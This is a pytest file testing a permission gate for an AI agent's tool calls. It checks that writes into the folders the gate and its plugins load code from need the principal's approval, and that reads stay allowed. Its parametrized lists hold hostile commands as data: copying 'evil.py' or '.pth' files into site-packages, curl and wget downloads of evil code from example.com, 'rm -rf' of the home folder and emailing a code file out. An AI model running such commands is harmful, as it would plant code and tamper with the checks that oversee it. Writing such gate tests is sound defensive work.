"""Issue #459: the other folders Exo loads code from are store folders too, as #435 made $EXO_HOME/plugins one.

The venv, whose site-packages holds the `exo` package and this gate (scripts/install.sh: ${EXO_VENV:-$EXO_HOME/venv}),
Hermes' plugin home, which the core loads exo-gate from with --with-hermes (EXO_HERMES_HOME, else
$EXO_HOME/hermes-home), the source copy the installer clones a git URL into and `exo update` refreshes from
($EXO_HOME/src), and the folders $EXO_PLUGIN_DIRS names (exo.core.plugins.default_dirs searches them first and keeps
the first plugin of a name, so a plugin of a core name there takes the real one's place) are the store: a write
there is a store_write, the floor, no standing grant, the principal alone. Reads stay reads. Every command string
here is data for exo.gate.classify/decide; none is run."""
import os

import pytest

from exo import gate

CLEAR_ENV = ("EXO_KEYS_FILE", "CLAUDE_CONFIG_DIR", "EXO_PRINCIPAL_STORE", "EXO_SEAT", "EXO_PLUGIN_DIRS",
             "EXO_VENV", "EXO_HERMES_HOME", "EXO_BUS_REGISTRY", "DIVAN_REGISTRY", "EXO_BUS_DB", "DIVAN_DB",
             "EXO_BUS_KEYS_DIR", "DIVAN_KEYS_DIR")


@pytest.fixture(params=["default", "custom"])
def exo_home(request, tmp_path, monkeypatch):
    """The folders' home as a command spells it: the default ~/.exo, or a custom EXO_HOME at a bare path. Either way
    each folder holds the code file the gate or the core loads, and EXO_PLUGIN_DIRS names a folder with a plugin of
    the core's own name."""
    home = tmp_path / "home"
    home.mkdir()
    monkeypatch.setenv("HOME", str(home))
    for name in CLEAR_ENV:
        monkeypatch.delenv(name, raising=False)
    if request.param == "custom":
        root = tmp_path / "srv" / "exo-home"
        monkeypatch.setenv("EXO_HOME", str(root))
        spelled = "$EXO_HOME"
    else:
        root = home / ".exo"
        monkeypatch.delenv("EXO_HOME", raising=False)
        spelled = "~/.exo"
    venv = root / "venv" / "lib" / "python3.13" / "site-packages" / "exo"
    venv.mkdir(parents=True)
    (venv / "gate.py").touch()
    (root / "hermes-home" / "plugins" / "exo-gate").mkdir(parents=True)
    (root / "hermes-home" / "plugins" / "exo-gate" / "__init__.py").touch()
    (root / "src" / "exo" / "plugins" / "exo-gate").mkdir(parents=True)
    (root / "src" / "exo" / "plugins" / "exo-gate" / "x.py").touch()
    dirs = tmp_path / "plugin-dirs"    # outside the home, as a checkout's plugins folder would be
    (dirs / "exo-gate").mkdir(parents=True)
    (dirs / "exo-gate" / "__init__.py").touch()
    monkeypatch.setenv("EXO_PLUGIN_DIRS", str(dirs))
    return spelled, str(dirs)


def _sh(cmd):
    return {"tool": "bash", "args": {"command": cmd}}


def _assert_store_write(action, policy=None):
    c = gate.classify(action)
    d = gate.decide(c, policy)
    assert (c.category, d.outcome, d.rule) == ("store_write", "ask", "floor"), action
    # principal-only, whatever approvals.yaml delegates
    assert gate.approvers_for(c.category, {"default": ["seat:lead"], "categories": {"store_write": ["seat:lead"]}}) \
        == ["principal"]


FOLDERS = ("venv", "hermes", "src", "dirs")


def _points(h, d, which):
    """(a code file in the folder, the folder's deepest shared layer) as the issue's table spells them."""
    return {
        "venv": (f"{h}/venv/lib/python3.13/site-packages/exo/gate.py", f"{h}/venv/lib/python3.13/site-packages"),
        "hermes": (f"{h}/hermes-home/plugins/exo-gate/__init__.py", f"{h}/hermes-home/plugins/exo-gate"),
        "src": (f"{h}/src/exo/plugins/exo-gate/x.py", f"{h}/src/exo/plugins/exo-gate"),
        "dirs": (f"{d}/exo-gate/__init__.py", d),
    }[which]


WRITES = [
    # the issue's rows: shell or local_write, and allowed, on main
    lambda f, p, h, d: _sh(f"cp evil.py {f}"),
    lambda f, p, h, d: {"tool": "write_file", "args": {"path": f, "content": "x"}},
    lambda f, p, h, d: _sh(f"cp x {p}/evil.pth"),
    lambda f, p, h, d: _sh(f"pip install --target {p} evil"),
    # every other way to put code there, the installer's ways (pip, git, tar) under them
    lambda f, p, h, d: _sh(f"pip install --target={p} evil"),
    lambda f, p, h, d: _sh(f"python3 -m pip install -t {p} evil"),
    lambda f, p, h, d: _sh(f"pip install --prefix {p} evil"),
    lambda f, p, h, d: _sh(f"pip install --root {p} evil"),
    lambda f, p, h, d: _sh(f"tar -C {p} -xf evil.tar"),
    lambda f, p, h, d: _sh(f"git clone https://example.com/evil.git {p}/evil"),
    lambda f, p, h, d: _sh(f"printf x > {f}"),
    lambda f, p, h, d: _sh(f"cat evil.py >> {f}"),
    lambda f, p, h, d: _sh(f"tee {f} < evil.py"),
    lambda f, p, h, d: _sh(f"sed -i s/a/b/ {f}"),
    lambda f, p, h, d: {"tool": "edit_file", "args": {"path": f, "old_string": "a", "new_string": "b"}},
    lambda f, p, h, d: {"tool": "patch", "args": {"path": f, "old_string": "a", "new_string": "b"}},
    lambda f, p, h, d: {"tool": "apply_patch",
                        "args": {"patch": f"*** Begin Patch\n*** Add File: {p}/evil.py\n+x\n*** End Patch"}},
    lambda f, p, h, d: _sh(f"mv /tmp/evil {p}/evil"),
    lambda f, p, h, d: _sh(f"install -m 644 evil.py {f}"),
    lambda f, p, h, d: _sh(f"ln -s /tmp/evil {p}/evil"),
    lambda f, p, h, d: _sh(f"cp -t {p} evil.py"),
    lambda f, p, h, d: _sh(f"cp -r /tmp/evil {p}/"),
    lambda f, p, h, d: _sh(f"rsync -a /tmp/evil/ {p}/evil/"),
    lambda f, p, h, d: _sh(f"unzip evil.zip -d {p}"),
    lambda f, p, h, d: _sh(f"curl -o {f} https://example.com/evil.py"),
    lambda f, p, h, d: _sh(f"wget -O {f} https://example.com/evil.py"),
    lambda f, p, h, d: _sh(f"mkdir -p {p}/evil"),
    lambda f, p, h, d: _sh(f"touch {f}"),
    lambda f, p, h, d: _sh(f"chmod 777 {p}"),
    lambda f, p, h, d: _sh(f"rm -rf {p}"),
    # the folder itself, or a folder above one that holds it
    lambda f, p, h, d: _sh(f"mv {h}/venv {h}/venv.off"),
    lambda f, p, h, d: _sh(f"rm -rf {h}/src"),
    lambda f, p, h, d: _sh(f"mv {h}/src {h}/src.off"),
    lambda f, p, h, d: _sh(f"rm -rf {h}/hermes-home"),
    lambda f, p, h, d: _sh(f"rm -rf {h}"),
    # relative after a cd into the folder, or a git -C beside it
    lambda f, p, h, d: _sh(f"cd {p} && cp evil.py {os.path.basename(f)}"),
    lambda f, p, h, d: _sh(f"cd {h}/venv && printf x > lib/python3.13/site-packages/evil.pth"),
    lambda f, p, h, d: _sh(f"git -C {p} checkout evil"),
    # a code file sent out keeps the send's checks as a part beside the store write, as #435 reads a plugin file
    lambda f, p, h, d: {"tool": "email_send",
                        "args": {"to": "a@b.c", "subject": "hi", "body": "hello", "files": [f]}},
]


@pytest.mark.parametrize("make", WRITES, ids=range(len(WRITES)))
@pytest.mark.parametrize("which", FOLDERS)
def test_a_write_into_a_code_folder_is_a_store_write(which, make, exo_home):
    h, d = exo_home
    f, p = _points(h, d, which)
    _assert_store_write(make(f, p, h, d))


# The names by themselves count anywhere, whatever EXO_HOME is, as `.exo/plugins` does (#435).
@pytest.mark.parametrize("make", [
    lambda h: _sh("cd ~ && cp x .exo/venv/lib/python3.13/site-packages/evil.pth"),
    lambda h: _sh("printf x > ./.exo/src/exo/plugins/exo-gate/x.py"),
    lambda h: _sh("cp x .exo/hermes-home/plugins/exo-gate/__init__.py"),
    lambda h: {"tool": "write_file", "args": {"path": ".exo/venv/lib/python3.13/site-packages/exo/gate.py",
                                              "content": "x"}},
], ids=range(4))
def test_the_names_match_anywhere(make, exo_home):
    _assert_store_write(make(os.environ["HOME"]))


def test_the_env_folders_count(exo_home, tmp_path, monkeypatch):
    """EXO_VENV and EXO_HERMES_HOME replace the home's own folders (install.sh, config.py's keys), and a second
    EXO_PLUGIN_DIRS entry is read as much as the first."""
    h, d = exo_home
    monkeypatch.setenv("EXO_VENV", str(venv := tmp_path / "venv-alt" / "lib" / "py"))
    monkeypatch.setenv("EXO_HERMES_HOME", str(hermes := tmp_path / "hermes-alt"))
    monkeypatch.setenv("EXO_PLUGIN_DIRS", os.pathsep.join([str(plug := tmp_path / "dirs-alt"), d]))
    for cmd in (f"cp x {venv}/evil.pth", f"cp x {hermes}/plugins/exo-gate/__init__.py",
                f"cp x {plug}/exo-gate/__init__.py", f"cp x {d}/exo-gate/__init__.py"):
        _assert_store_write(_sh(cmd))


def test_the_principal_can_still_deny_it(exo_home):
    h, d = exo_home
    f, p = _points(h, d, "venv")
    c = gate.classify(_sh(f"cp evil.py {p}/exo/gate.py"))
    assert gate.decide(c, {"gates": {"deny": ["store_write"]}}).outcome == "deny"
    assert gate.decide(c, {"gates": {"categories": {"store_write": "deny"}}}).outcome == "deny"
    # a shell line keeps the command it was built from, so a deny on that still holds (D-075)
    assert gate.decide(c, {"gates": {"deny": ["shell"]}}).outcome == "deny"
    # no policy lowers it
    assert gate.decide(c, {"gates": {"categories": {"store_write": "allow"}}}).outcome == "ask"
    # a file tool's write keeps a local_write part for the file it writes (#448), so a deny on that still holds too
    w = gate.classify({"tool": "write_file", "args": {"path": f, "content": "x"}})
    assert gate.decide(w, {"gates": {"deny": ["local_write"]}}).outcome == "deny"
    assert gate.decide(w, {"gates": {"deny": ["store_write"]}}).outcome == "deny"
    assert gate.decide(w, {"gates": {"deny": [f"target:{p}/*"]}}).outcome == "deny"


@pytest.mark.parametrize("cmd", [
    "cat {h}/venv/lib/python3.13/site-packages/exo/gate.py",
    "ls {h}/src/exo/plugins",
    "grep -rn register {h}/hermes-home/plugins/exo-gate",
    "find {d}/exo-gate -name '*.yaml'",
    "git -C {h}/src/exo log",
    "cd {h}/venv/lib/python3.13/site-packages/exo && cat gate.py",
    "diff {h}/src/exo/plugins/exo-gate/x.py /tmp/x.py",
])
def test_a_read_of_a_code_folder_stays_a_read(cmd, exo_home):
    h, d = exo_home
    c = gate.classify(_sh(cmd.format(h=h, d=d)))
    assert (c.category, gate.decide(c).outcome) == ("read", "allow")


@pytest.mark.parametrize("tool", ["read_file", "list_dir", "grep", "glob"])
def test_a_read_tool_on_a_code_folder_stays_a_read(tool, exo_home):
    h, d = exo_home
    c = gate.classify({"tool": tool, "args": {"path": d + "/exo-gate", "pattern": "register"}})
    assert (c.category, gate.decide(c).outcome) == ("read", "allow")


@pytest.mark.parametrize("make, category", [
    (lambda h: _sh("cp x venv/lib/py/x.py"), "shell"),                 # the tool's own working folder
    (lambda h: _sh(f"cp x {h}/.venv/lib/py/x.py"), "shell"),           # a .venv name is not Exo's
    (lambda h: _sh(f"cp x {h}/venvs/alt/lib/py/x.py"), "shell"),
    (lambda h: _sh(f"cp x {h}/hermes-home/state/x"), "shell"),         # Hermes' own state is not the code
    (lambda h: {"tool": "write_file", "args": {"path": f"{h}/src.off/exo/x.py", "content": "x"}}, "local_write"),
    (lambda h: _sh(f"cp x {h}/src2/exo/x.py"), "shell"),
], ids=range(6))
def test_other_code_like_paths_keep_their_class(make, category, exo_home):
    h, _ = exo_home
    assert gate.classify(make(h)).category == category


def test_the_reported_pip_cost(exo_home):
    """The trade D-038 notes: a `pip install` into the venv Exo itself runs from now asks, where it did not.
    Everyday work installs into a project or a scratch venv, not into $EXO_HOME/venv, so the ask is rare."""
    h, _ = exo_home
    c = gate.classify(_sh(f"pip install --target {h}/venv/lib/python3.13/site-packages evil"))
    assert gate.decide(c).outcome == "ask"
